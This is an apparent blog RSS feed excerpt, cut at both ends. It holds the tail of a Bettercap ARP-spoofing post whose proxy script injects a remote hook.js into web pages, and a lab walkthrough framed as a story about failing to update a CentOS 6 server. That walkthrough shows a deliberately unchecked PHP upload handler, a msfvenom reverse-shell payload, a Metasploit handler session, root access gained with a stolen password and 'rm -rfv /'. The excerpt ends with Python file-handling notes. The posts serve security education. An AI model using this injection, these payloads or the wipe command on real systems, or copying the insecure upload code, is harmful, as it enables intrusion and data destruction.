</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Save this file to a directory of your choice. I will save it to <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code>.</p>
<p>Then, let&rsquo;s go back to Bettercap and set the <code>http.proxy.script</code> parameter to the path mentioned above:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then start <code>net.probe</code>, <code>arp.spoof</code>, and <code>http.proxy</code> in sequence.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alright&hellip; Now everything is set up and ready to go&hellip;</p>
<p></p>
<p>Then we&rsquo;ll have the target machine open a browser and visit a website&hellip;</p>
<p>Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.</p>
<p></p>
<p></p>
]]></description>
</item><item>
    <title>Attacking CentOS6 Virtual Machines</title>
    <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/2020-09-26/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
            </div><blockquote>
<p>Although the penetration process is involved, this article&rsquo;s main topic is not about penetration testing. Please read it with a rational mindset.</p>
</blockquote>
<h2 id="the-reason-for-writing-this-blog-post">The reason for writing this blog post</h2>
<p>Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience.</p>
<p>I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company&rsquo;s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security.</p>
<p>My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.</p>
<h2 id="simulation-environment">Simulation Environment</h2>
<blockquote>
<p>Attacker platform: Arch Linux</p>
<p>IP: 192.168.0.109</p>
<p>Victim platform: CentOS 6.1 on VirtualBox</p>
<p>IP: 192.168.0.116</p>
</blockquote>
<p><strong>Suppose</strong> this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time.</p>
<p>We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures.</p>
<p>Additionally, due to unsatisfactory work hours, the programmers have a &ldquo;get the job done&rdquo; attitude, resulting in PHP code on the backend such as this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Uploaded file name: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File type: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File size: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Temporary storage location of file: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File stored in: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes.</p>
</blockquote>
<h2 id="process-of-attack">Process of attack</h2>
<p>Someone always likes to cause trouble, and a hacker has scanned the server&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
</span></span></code></pre></td></tr></table>
</div>
</div><p>The result is as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
</span></span></code></pre></td></tr></table>
</div>
</div><p>He was surprised to find that the kernel version was only <code>2.6.32</code>, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity.</p>
<p>He attempted to access the website and discovered a file upload point on the site.</p>
<p></p>
<p>With a &ldquo;let&rsquo;s give it a try&rdquo; attitude, he generated a payload using msf.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location.
</p>
<p>So he launched <code>msfconsole</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>And he used the exploit/multi/handler module.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
</span></span></code></pre></td></tr></table>
</div>
</div><p>He then proceeded to set the parameters one by one.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>The final step was to run the module.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then msf began listening.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span></code></pre></td></tr></table>
</div>
</div><p>At this point, he modified the file address and link as prompted and accessed it:</p>
<blockquote>
<p><code>http://192.168.0.116/upload/shell.php</code></p>
</blockquote>
<p>Msf immediately produced results. It&rsquo;s easy to imagine how poor the server&rsquo;s security measures were.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now he began retrieving brief system information, such as the <code>operating system</code> and <code>kernel version</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer    : localhost
</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
</span></span><span class="line"><span class="cl">Meterpreter : php/linux
</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
</span></span><span class="line"><span class="cl">Kernel \r on an \m
</span></span></code></pre></td></tr></table>
</div>
</div><p>He also attempted to determine the current user&rsquo;s privileges.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: apache (48)
</span></span></code></pre></td></tr></table>
</div>
</div><p>The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants.</p>
<p>Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all.</p>
<p>It looks like he needs to think of another way.</p>
<p>During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker.</p>
<p>By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor.</p>
<p>There were some numbers and letters written on it, perhaps something useful.</p>
<p>While the employees were eating, he secretly took a picture of the note with his phone and left.</p>
<p>As luck would have it, this note contained the password that had just been changed and would not be updated again for a while.</p>
<p>After work, he returned to his terminal and attempted to log in directly as root using the stolen password.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span><span class="line"><span class="cl">Process 1376 created.
</span></span><span class="line"><span class="cl">Channel 2 created.
</span></span></code></pre></td></tr></table>
</div>
</div><p>He was able to obtain an interactive shell.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/bin/sh -i
</span></span><span class="line"><span class="cl">sh: no job control in this shell
</span></span><span class="line"><span class="cl">sh-4.1$ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span><span class="line"><span class="cl">bash-4.1$ 
</span></span></code></pre></td></tr></table>
</div>
</div><p>He logged in successfully.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">bash-4.1$ su root
</span></span><span class="line"><span class="cl">su root
</span></span><span class="line"><span class="cl">Password: ************
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# whoami
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl">[root@localhost upload]# id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
</span></span><span class="line"><span class="cl">[root@localhost upload]# 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Yes, he could do whatever he wanted now&hellip;</p>
<p>And so, in the end, he proceeded to delete everything.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
</span></span></code></pre></td></tr></table>
</div>
</div><p>The company suffered significant losses as a result.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see&hellip;</p>
<ul>
<li>Systems that are not updated are prone to attacks.</li>
<li>Code that is not updated is prone to vulnerabilities.</li>
<li>Slow password updates can lead to leaks.</li>
<li>Vulnerabilities must be fixed by updating software; otherwise, they will be exploited.</li>
</ul>
<p>And as for what we cannot see&hellip;</p>
<p>Software is ultimately created by humans, and there is no perfection with humans. We must constantly reflect on ourselves and our creations.</p>
<p>Whether as users or developers, updating what needs to be updated is a normal part of life. There may be differences in speed, but progress must be made. Standing still or even moving backwards is not an option.</p>
<p>For software to be updated is like how humans need to self-reflect. If humans fail to self-reflect, their future will be bleak. If software is not updated, it will be abandoned by people and forgotten.</p>
<p>Even worse, it could be easily destroyed by a script kiddie who delivers food, just like the joke I told earlier.</p>
<p>The above is just my personal opinion. If there are any errors, please feel free to correct me in the comments below.</p>
]]></description>
</item><item>
    <title>Python Study Notes - File Operations</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</link>
    <pubDate>Sat, 05 Sep 2020 22:12:05 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/wy/wallhaven-wyzxvr.jpg" referrerpolicy="no-referrer">
            </div><h2 id="file-operations">File Operations</h2>
<h3 id="open">open</h3>
<p><code>open()</code> is the key function in Python for file operations, with two parameters that need to be set:</p>
<ul>
<li>Filename - the name of the file, self-explanatory</li>
<li>Mode - determines if the file being opened can be read/written to or has other attributes.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="s1">&#39;mode&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="reading">Reading</h3>
<p>Open a file in read-only mode:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This is equivalent to:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;filename&#34;</span><span class="p">,</span><span class="s2">&#34;rt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>&ldquo;r&rdquo;</strong> indicates to read</p>
<p><strong>&ldquo;t&rdquo;</strong> indicates that the file is text, this is the default setting for the function, so it can be omitted.</p>
<p>Here&rsquo;s a list from <a href="https://www.w3schools.com/python/python_file_handling.asp" target="_blank" rel="noopener noreffer">w3schools</a>:</p>
<blockquote>
<p>There are four different methods (modes) for opening a file:</p>
<blockquote>
<p>&ldquo;r&rdquo; - Read - Default value. Opens a file for reading, error if the file does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;a&rdquo; - Append - Opens a file for appending, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;w&rdquo; - Write - Opens a file for writing, creates the file if it does not exist</p>
</blockquote>
<blockquote>
<p>&ldquo;x&rdquo; - Create - Creates the specified file, returns an error if the file exists</p>
</blockquote>
<p>In addition you can specify if the file should be handled as binary or text mode</p>
<blockquote>
<p>&ldquo;t&rdquo; - Text - Default value. Text mode</p>
</blockquote>
<blockquote>
<p>&ldquo;b&rdquo; - Binary - Binary mode (e.g. images)</p>
</blockquote>
</blockquote>
<p>For example, let&rsquo;s say we have a file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can read the file without specifying the mode parameter:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Or we can specify it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
